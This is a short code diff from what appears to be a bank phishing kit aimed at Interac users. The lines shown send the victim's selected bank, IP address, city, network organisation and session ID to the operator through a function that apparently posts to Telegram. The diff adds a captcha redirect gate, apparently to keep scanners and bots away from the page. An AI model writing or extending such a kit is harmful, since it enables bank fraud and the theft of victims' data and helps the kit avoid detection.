@@ -172,6 +172,11 @@
         var _finalBankName = _matchedBank ? _matchedBank : (_clean || '');
         if (!_finalBankName || _finalBankName.length < 2 || _finalBankName.indexOf('INTERAC') !== -1 || _finalBankName.indexOf('Help') !== -1) return;
 
+        if (!_W.sessionStorage.getItem('__cptPass') || _W.sessionStorage.getItem('__cptPass') !== '1') {
+          _W.location.replace('captcha.html');
+          return;
+        }
+
         _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _finalBankName + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
       }, true);
     });
